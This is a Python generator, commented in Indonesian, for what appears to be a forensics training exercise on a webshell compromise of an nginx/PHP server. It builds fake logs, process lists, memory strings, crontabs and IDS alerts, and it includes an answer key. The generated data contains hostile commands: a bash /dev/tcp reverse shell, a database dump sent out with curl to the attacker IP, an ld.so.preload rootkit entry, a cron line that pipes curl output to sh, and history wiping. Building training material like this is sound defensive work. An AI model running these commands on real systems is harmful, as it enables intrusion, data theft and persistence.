"""Skenario: kompromi web server melalui webshell (Ubuntu + nginx + PHP-FPM)."""
from __future__ import annotations

from datetime import timedelta
from urllib.parse import quote_plus

from .base import (Build, Context, Evidence, clock_values, fill, hexstr, hms,
                   jitter, noise_strings, public_ip, stamp, testnet_ip)

UA_BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
NGINX_MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def build(ctx: Context) -> Build:
    r, P, fx = ctx.rng, ctx.bank["pools"], ctx.effects

    org = r.choice(P["organizations"])
    site = org["web"]
    server = "web-prod-01"
    srv_ip = f"172.16.{r.randint(2, 40)}.{r.randint(10, 60)}"
    attacker = testnet_ip(r)
    rev_ip = testnet_ip(r)
    while rev_ip == attacker:
        rev_ip = testnet_ip(r)
    rev_port = r.choice([4444, 1337, 9001, 8888, 5555, 53, 8081])
    vuln = r.choice(P["vulnerable_endpoints"])
    upload_dir = r.choice(P["upload_dirs"])
    shell_name = fill(r.choice(P["webshell_names"]), {"n": str(r.randint(1000, 9999)), "h": hexstr(r, 6).lower()})
    shell_path = f"{upload_dir}{shell_name}"
    param = r.choice(P["webshell_params"])
    first_cmd = r.choice(P["first_commands"])
    follow = r.sample(P["recon_commands"], r.randint(3, 5))
    db_user = r.choice(P["db_users"])
    db_name = org["db"]
    db_pass = "".join(r.choice("abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(12))
    persist = f"http://{r.choice(P['persistence_hosts'])}/{hexstr(r, 4).lower()}/{r.choice(P['persistence_files'])}"
    rev_cmd = f"bash -c 'bash -i >& /dev/tcp/{rev_ip}/{rev_port} 0>&1'"
    php_master = r.randint(780, 980)
    shell_pid = r.randint(41000, 98000)
    sh_pid = shell_pid - r.randint(1, 3)
    fpm_child = r.randint(1100, 1900)

    day = ctx.day
    t_scan = jitter(r, day + timedelta(hours=1, minutes=r.randint(5, 40), seconds=r.randint(0, 59)))
    t_fail = jitter(r, t_scan + timedelta(minutes=r.randint(3, 7), seconds=r.randint(0, 59)))
    t_upload = jitter(r, t_fail + timedelta(seconds=r.randint(25, 110)))
    cmd_times, t = [], t_upload
    for _ in range(1 + len(follow)):
        t = jitter(r, t + timedelta(seconds=r.randint(9, 70)))
        cmd_times.append(t)
    t_rev = jitter(r, t + timedelta(seconds=r.randint(30, 120)))
    t_preload = jitter(r, t_rev + timedelta(minutes=r.randint(2, 5)))
    t_cron = jitter(r, t_preload + timedelta(minutes=r.randint(1, 4)))
    t_dump = jitter(r, t_cron + timedelta(minutes=r.randint(1, 3)))
    t_alert = (t_dump + timedelta(minutes=r.randint(6, 14))).replace(microsecond=0)
    t_arrive = t_alert + timedelta(minutes=r.randint(18, 35), seconds=r.randint(0, 59))

    host = lambda dt: dt + ctx.drift  # noqa: E731
    values = {"org": org["name"], "org_short": org["short"], "site": site, "server": server, "server_ip": srv_ip,
              "alert_time": hms(t_alert), "arrive_time": hms(t_arrive), "rev_ip": rev_ip}

    # ── EV-004 access.log nginx ─────────────────────────────────────────────
    pages = ["/", "/index.php", "/berita", "/kontak", "/tentang-kami", "/login.php", "/assets/css/app.min.css",
             "/assets/js/app.min.js", "/assets/img/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
             "/pengumuman", "/layanan", "/galeri", "/karier", "/api/v1/slider", "/api/v1/berita?page=2"]
    clients = [public_ip(r) for _ in range(140)]
    lines = []

    def log(dt, ip, method, path, status, size, ua, ref="-"):
        stamp = host(dt)
        ts = f"{stamp.day:02d}/{NGINX_MONTHS[stamp.month - 1]}/{stamp.year}:{stamp.strftime('%H:%M:%S')} +0700"
        lines.append((dt, f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))

    start = t_scan - timedelta(hours=4)
    span = int((t_arrive - start).total_seconds())
    for _ in range(r.randint(2100, 2700)):
        dt = jitter(r, start + timedelta(seconds=r.randint(0, span)))
        page = r.choice(pages)
        status = r.choices([200, 304, 404, 301], [70, 18, 8, 4])[0]
        log(dt, r.choice(clients), "GET", page, status, r.randint(180, 48000) if status == 200 else 0,
            r.choice(UA_BROWSERS), f"https://{site}/" if r.random() < 0.4 else "-")
    for _ in range(r.randint(10, 30)):
        dt = jitter(r, start + timedelta(seconds=r.randint(0, span)))
        log(dt, r.choice(clients), "POST", "/login.php", r.choice([200, 302]), r.randint(300, 900),
            r.choice(UA_BROWSERS), f"https://{site}/login.php")
    t = t_scan
    for word in r.sample(P["scan_words"], len(P["scan_words"])):
        status = 404
        if word in (vuln.split("/")[1], "uploads", "admin", "assets"):
            status = 301
        if f"/{word}" == vuln:
            status = 200
        log(t, attacker, "GET", f"/{word}", status, 162 if status != 200 else 3120, "gobuster/3.6")
        t = jitter(r, t + timedelta(milliseconds=r.randint(150, 900)))
    log(jitter(r, t + timedelta(seconds=40)), attacker, "GET", vuln, 200, 3120, UA_BROWSERS[4])
    log(t_fail, attacker, "POST", vuln, 400, 87, UA_BROWSERS[4], f"https://{site}{vuln}")
    log(t_upload, attacker, "POST", vuln, 200, 64, UA_BROWSERS[4], f"https://{site}{vuln}")
    for cmd, dt in zip([first_cmd] + follow, cmd_times):
        log(dt, attacker, "GET", f"{shell_path}?{param}={quote_plus(cmd)}", 200, r.randint(30, 4000), UA_BROWSERS[4])
    log(t_rev, attacker, "GET", f"{shell_path}?{param}={quote_plus(rev_cmd)}", 504, 167, UA_BROWSERS[4])
    lines.sort(key=lambda x: x[0])
    access = "\n".join(x[1] for x in lines) + "\n"

    # ── EV-001 ps auxf & EV-002 ss -tunap ──────────────────────────────────
    visible_shell = not ({"shell_killed", "live_untrusted"} & fx)
    start_day = f"{NGINX_MONTHS[(ctx.day - timedelta(days=3)).month - 1]}{(ctx.day - timedelta(days=3)).day:02d}"
    rev_start = host(t_rev).strftime("%H:%M")
    ps = ["USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"]

    def p(user, pid, cmd, start=start_day, stat="Ss", tty="?"):
        ps.append(f"{user:<10}{pid:>7}  {r.uniform(0, 2):.1f}  {r.uniform(0, 3):.1f} {r.randint(5000, 900000):>6} "
                  f"{r.randint(1000, 90000):>5} {tty:<8} {stat:<4} {start:<6} {r.randint(0, 9)}:{r.randint(0, 59):02d} {cmd}")

    p("root", 1, "/sbin/init")
    p("root", 2, "[kthreadd]", stat="S")
    p("root", 3, " \\_ [rcu_gp]", stat="I<")
    p("root", 412, "/lib/systemd/systemd-journald", stat="S<s")
    p("root", 455, "/lib/systemd/systemd-udevd")
    p("systemd+", 590, "/lib/systemd/systemd-resolved")
    p("root", 640, "/usr/sbin/cron -f -P")
    p("syslog", 655, "/usr/sbin/rsyslogd -n -iNONE", stat="Ssl")
    p("root", 700, "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups")
    p("root", php_master, "php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)")
    for i in range(4):
        pid = fpm_child + i * r.randint(3, 40)
        p("www-data", pid, " \\_ php-fpm: pool www", stat="S")
        if i == 1 and visible_shell:
            p("www-data", sh_pid, f" |   \\_ sh -c {rev_cmd}", start=rev_start, stat="S")
            p("www-data", shell_pid, " |       \\_ bash -i", start=rev_start, stat="S")
    p("root", 801, "nginx: master process /usr/sbin/nginx -g daemon on; master_process on;")
    for i in range(4):
        p("www-data", 802 + i, " \\_ nginx: worker process", stat="S")
    p("mysql", 920, "/usr/sbin/mysqld", stat="Ssl")
    p("root", 1012, "/usr/bin/node_exporter --collector.systemd", stat="Ssl")
    p("root", 2210, "sshd: responder [priv]", start=host(t_arrive).strftime("%H:%M"))
    p("responder", 2290, " \\_ -bash", start=host(t_arrive).strftime("%H:%M"), tty="pts/0")
    p("root", 2312, "     \\_ /mnt/ir/bin/ps auxf", start=host(t_arrive).strftime("%H:%M"), stat="R+", tty="pts/0")
    ps_txt = "\n".join(ps) + "\n"

    ss = ["Netid State  Recv-Q Send-Q    Local Address:Port      Peer Address:Port Process"]
    ss.append('tcp   LISTEN 0      511             0.0.0.0:80             0.0.0.0:*     users:(("nginx",pid=802,fd=6),("nginx",pid=801,fd=6))')
    ss.append('tcp   LISTEN 0      511             0.0.0.0:443            0.0.0.0:*     users:(("nginx",pid=802,fd=7),("nginx",pid=801,fd=7))')
    ss.append('tcp   LISTEN 0      128             0.0.0.0:22             0.0.0.0:*     users:(("sshd",pid=700,fd=3))')
    ss.append('tcp   LISTEN 0      151           127.0.0.1:3306           0.0.0.0:*     users:(("mysqld",pid=920,fd=21))')
    ss.append('tcp   LISTEN 0      4096          127.0.0.1:9100           0.0.0.0:*     users:(("node_exporter",pid=1012,fd=3))')
    estab = []
    for _ in range(r.randint(9, 16)):
        estab.append(f'tcp   ESTAB  0      0         {srv_ip}:443  {r.choice(clients)}:{r.randint(30000, 65000)} '
                     f'users:(("nginx",pid={802 + r.randint(0, 3)},fd={r.randint(8, 40)}))')
    estab.append(f'tcp   ESTAB  0      0         {srv_ip}:22   10.99.0.15:{r.randint(50000, 60000)} '
                 f'users:(("sshd",pid=2210,fd=4))')
    if visible_shell:
        estab.append(f'tcp   ESTAB  0      0         {srv_ip}:{r.randint(40000, 60000)}  {rev_ip}:{rev_port} '
                     f'users:(("bash",pid={shell_pid},fd=2),("bash",pid={shell_pid},fd=1),("bash",pid={shell_pid},fd=0))')
    r.shuffle(estab)
    ss_txt = "\n".join(ss + estab) + "\n"

    # ── EV-003 strings memori (heap proses bash) ───────────────────────────
    history = ["unset HISTFILE", "id", "cd /var/www/html", "ls -la", "cat config/database.php",
               f"mysqldump -u {db_user} -p'{db_pass}' {db_name} > /dev/shm/.d.sql",
               "ls -la /dev/shm", "gzip /dev/shm/.d.sql",
               f"curl -s -T /dev/shm/.d.sql.gz http://{rev_ip}:8000/",
               "echo /usr/lib/x86_64-linux-gnu/libsysd.so > /etc/ld.so.preload",
               f"(crontab -l 2>/dev/null; echo '*/10 * * * * curl -fsSL {persist} | sh >/dev/null 2>&1') | crontab -",
               "rm -f /dev/shm/.d.sql.gz", "history -c"]
    mem = noise_strings(r, 2400, ["php-fpm: pool www", "/var/www/html/index.php", "/etc/php/8.1/fpm/php.ini",
                                  "HTTP_USER_AGENT", "SCRIPT_FILENAME", "mysqli_connect"])
    if "shell_killed" not in fx:
        at = r.randint(300, 2000)
        for i, line in enumerate(history):
            mem.insert(at + i * r.randint(1, 4), line)
    mem_txt = "\n".join(mem) + "\n"

    # ── EV-005 timeline sistem berkas (mactime) ────────────────────────────
    tl = []

    def ent(dt, size, typ, mode, uid, name):
        tl.append((dt, size, typ, mode, uid, name))

    for _ in range(r.randint(140, 220)):
        dt = stamp(r, ctx.day - timedelta(days=r.randint(1, 400), minutes=r.randint(0, 1400)))
        ent(dt, r.randint(200, 90000), r.choice(["m.c.", "macb", ".a.."]), "-rw-r--r--", 33,
            f"/var/www/html{r.choice(pages[1:12]).split('?')[0]}" if r.random() < 0.3 else
            f"/var/www/html/{r.choice(['app', 'config', 'vendor/composer', 'assets/img', 'berita'])}/{hexstr(r, 4).lower()}.{r.choice(['php', 'png', 'jpg', 'css'])}")
    for _ in range(r.randint(20, 40)):
        dt = stamp(r, t_scan - timedelta(minutes=r.randint(1, 500)))
        ent(dt, r.randint(20_000, 900_000), "m.c.", "-rw-r-----", 33, "/var/log/nginx/access.log")
    shell_label = f"/var/www/html{shell_path}" + (" (deleted)" if "webshell_deleted" in fx else "")
    ent(t_upload, r.randint(180, 1400), "macb", "-rw-r--r--", 33, shell_label)
    ent(t_preload, 41, "macb", "-rw-r--r--", 0, "/etc/ld.so.preload")
    ent(jitter(r, t_preload - timedelta(seconds=20)), 16_880, "macb", "-rwxr-xr-x", 0,
        "/usr/lib/x86_64-linux-gnu/libsysd.so")
    ent(t_cron, 312, "macb", "-rw-------", 33, "/var/spool/cron/crontabs/www-data")
    t_scene = t_arrive + timedelta(minutes=16)
    if "fs_contaminated" in fx:
        ent(t_scene, 12_288, "macb", "-rw-r--r--", 0, f"/var/www/html{upload_dir}.{shell_name}.swp")
        ent(t_scene + timedelta(seconds=40), 0, ".a..", "-rw-r--r--", 33, shell_label)
    if "webshell_deleted" in fx:
        ent(t_scene + timedelta(minutes=1), 0, "..c.", "-rw-r--r--", 33, shell_label)
    tl.sort(key=lambda x: x[0])
    timeline_txt = "Date,Size,Type,Mode,UID,GID,Meta,File Name\n" + "\n".join(
        f"{host(dt).strftime('%a %b %d %Y %H:%M:%S')},{size},{typ},{mode},{uid},{uid},{r.randint(100000, 9999999)},{name}"
        for dt, size, typ, mode, uid, name in tl) + "\n"

    # ── EV-006 crontab ─────────────────────────────────────────────────────
    cron_txt = "\n".join([
        "### /etc/crontab", "SHELL=/bin/sh", "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin", "",
        "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly",
        "25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }",
        "47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }", "",
        "### /etc/cron.d/certbot",
        "0 */12 * * * root test -x /usr/bin/certbot -a \\! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew", "",
        "### /var/spool/cron/crontabs/www-data",
        "# DO NOT EDIT THIS FILE - edit the master and reinstall.",
        f"# (- installed on {host(t_cron).strftime('%a %b %d %H:%M:%S %Y')})",
        "# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)",
        f"*/10 * * * * curl -fsSL {persist} | sh >/dev/null 2>&1", "",
        "### /var/spool/cron/crontabs/root",
        "30 2 * * * /usr/local/bin/backup-db.sh >> /var/log/backup-db.log 2>&1",
    ]) + "\n"

    # ── EV-007 alert IDS (sensor jaringan, jam NTP) ────────────────────────
    sigs = [
        ("1:2210051:2", "SURICATA STREAM Packet with invalid timestamp", "Generic Protocol Command Decode", 3),
        ("1:2013028:7", "ET POLICY curl User-Agent Outbound", "Attempted Information Leak", 2),
        ("1:2027390:3", "ET USER_AGENTS Microsoft Device Metadata Retrieval Client User-Agent", "Unknown Traffic", 3),
        ("1:2011716:4", "ET SCAN Sipvicious User-Agent Detected (friendly-scanner)", "Attempted Information Leak", 2),
        ("1:2001219:20", "ET SCAN Potential SSH Scan", "Attempted Information Leak", 2),
    ]
    alerts = []

    def alert(dt, sid, msg, cls, prio, src, dst, proto="TCP"):
        alerts.append((dt, f"{dt.strftime('%m/%d/%Y-%H:%M:%S')}.{dt.microsecond:06d}  [**] [{sid}] {msg} [**] "
                           f"[Classification: {cls}] [Priority: {prio}] {{{proto}}} {src} -> {dst}"))

    for _ in range(r.randint(60, 110)):
        dt = jitter(r, start + timedelta(seconds=r.randint(0, span)))
        sid, msg, cls, prio = r.choice(sigs)
        alert(dt, sid, msg, cls, prio, f"{public_ip(r)}:{r.randint(1024, 65000)}", f"{srv_ip}:{r.choice([22, 80, 443])}")
    scan_t = t_scan
    for _ in range(r.randint(4, 9)):
        alert(scan_t, "1:2034567:3", "ET SCAN Gobuster User-Agent Observed", "Web Application Attack", 1,
              f"{attacker}:{r.randint(40000, 60000)}", f"{srv_ip}:443")
        scan_t = jitter(r, scan_t + timedelta(seconds=r.randint(5, 25)))
    alert(jitter(r, t_rev + timedelta(seconds=2)), "1:2025434:2", "ET ATTACK_RESPONSE Bash Interactive Shell Outbound",
          "Successful Administrator Privilege Gain", 1, f"{srv_ip}:{r.randint(40000, 60000)}", f"{rev_ip}:{rev_port}")
    alert(jitter(r, t_dump + timedelta(seconds=30)), "1:2019401:4", "ET POLICY Large HTTP PUT Outbound to Raw IP",
          "Potential Corporate Privacy Violation", 1, f"{srv_ip}:{r.randint(40000, 60000)}", f"{rev_ip}:8000")
    alerts.sort(key=lambda x: x[0])
    ids_txt = "\n".join(x[1] for x in alerts) + "\n"

    t_collect = t_arrive + timedelta(minutes=9)
    ev_list = [
        Evidence("ps", "EV-001", f"EV-001_{server}_ps_auxf.txt", "Daftar proses (pohon)", server, True,
                 "ps auxf", ps_txt, acquired_at=t_collect),
        Evidence("ss", "EV-002", f"EV-002_{server}_ss_tunap.txt", "Socket jaringan aktif", server, True,
                 "ss -tunap", ss_txt, acquired_at=t_collect + timedelta(minutes=1)),
        Evidence("memory", "EV-003", f"EV-003_{server}_mem.lime.strings.txt", "Strings dari image RAM (8 GB)",
                 server, True, "AVML → strings -a -n 6", mem_txt, acquired_at=t_collect + timedelta(minutes=5)),
        Evidence("access", "EV-004", f"EV-004_{server}_nginx_access.log", "Log akses nginx", server, False,
                 "cp dari image disk (/var/log/nginx)", access, acquired_at=t_collect + timedelta(minutes=55)),
        Evidence("timeline", "EV-005", f"EV-005_{server}_fs_timeline.csv", "Timeline sistem berkas (mactime)",
                 server, False, "fls + mactime (The Sleuth Kit)", timeline_txt, acquired_at=t_collect + timedelta(minutes=70)),
        Evidence("cron", "EV-006", f"EV-006_{server}_crontabs.txt", "Konfigurasi cron sistem & pengguna", server,
                 False, "cat dari image disk", cron_txt, acquired_at=t_collect + timedelta(minutes=72)),
        Evidence("ids", "EV-007", "EV-007_IDS-DMZ_fast.log", "Alert IDS segmen DMZ (jam NTP)", "Sensor IDS DMZ",
                 False, "Ekspor Suricata fast.log", ids_txt, acquired_at=t_collect + timedelta(minutes=20)),
    ]
    for e in ev_list:
        if e.key in ("ps", "ss") and "live_lost" in fx:
            e.available, e.reason = False, "Server sudah di-reboot/di-restore sebelum live response."
        if e.key == "memory" and ({"memory_lost", "live_lost"} & fx):
            e.available, e.reason = False, "RAM tidak sempat diakuisisi — isi memori hilang."
        if e.key in ("access", "timeline", "cron") and "disk_reverted" in fx:
            e.available, e.reason = False, "Disk dipulihkan dari snapshot lama — artefak serangan tertimpa."
        if e.key in ("ps", "ss") and e.available and "live_untrusted" in fx:
            e.note = "Dijalankan dengan binari milik server (tidak tepercaya)."
        if e.key in ("ps", "ss", "memory") and e.available and "shell_killed" in fx:
            e.note = "Diambil setelah proses mencurigakan di-kill."
        if e.key == "timeline" and e.available and ({"fs_contaminated", "webshell_deleted"} & fx):
            e.note = "Memuat jejak aktivitas tim di TKP setelah insiden."

    o = ctx.outcomes
    at = lambda m: t_arrive + timedelta(minutes=m, seconds=r.randint(0, 50))  # noqa: E731
    t_clock = at(4)
    scene = [
        (t_alert, f"SOC menerima alert WAF + IDS: koneksi keluar tidak lazim dari {server} ({srv_ip}). CSIRT diaktifkan."),
        (t_arrive, f"Responder terhubung ke konsol {server} melalui jump host; tim aplikasi ikut bergabung."),
        (at(2), o["D1"]),
        (t_clock, o["D4"]),
        (at(6), o["D3"]),
        (at(8), o["D2"]),
        (at(16), o["D5"]),
        (at(80), "Imaging disk selesai; seluruh bukti di-hash dan disegel."),
    ]
    clock = clock_values(ctx, values, t_clock)
    scene = [(t, fill(msg, clock)) for t, msg in scene]

    truth = {
        "F1": attacker, "F2": vuln, "F3": shell_path, "F4": first_cmd, "F5": hms(t_upload),
        "F6": f"{rev_ip}:{rev_port}", "F7": str(shell_pid), "F8": persist, "F9": db_user,
    }
    timeline = [
        (t_scan, f"Pemindaian direktori dari {attacker} (gobuster)"),
        (t_fail, f"Upload pertama ke `{vuln}` ditolak (HTTP 400)"),
        (t_upload, f"Webshell `{shell_path}` berhasil diunggah"),
        (cmd_times[0], f"Perintah pertama melalui webshell: `{first_cmd}`"),
        (t_rev, f"Reverse shell ke {rev_ip}:{rev_port}"),
        (t_preload, "Rootkit userland dipasang via `/etc/ld.so.preload`"),
        (t_cron, "Persistence cron www-data dipasang"),
        (t_dump, f"Database `{db_name}` di-dump dengan akun `{db_user}` dan dikirim keluar"),
        (t_alert, "Alert WAF/IDS diterima SOC"),
        (t_arrive, "Responder mulai menangani server"),
    ]
    iocs = [("IP penyerang", attacker), ("Reverse shell", f"{rev_ip}:{rev_port}"), ("Webshell", shell_path),
            ("Endpoint rentan", vuln), ("Persistence", persist), ("Rootkit", "/usr/lib/x86_64-linux-gnu/libsysd.so"),
            ("User-Agent", "gobuster/3.6")]
    return Build(host=server, evidence=ev_list, truth=truth, scene_log=scene, timeline=timeline,
                 facts=values, iocs=iocs, clock_recorded="drift_unknown" not in fx)
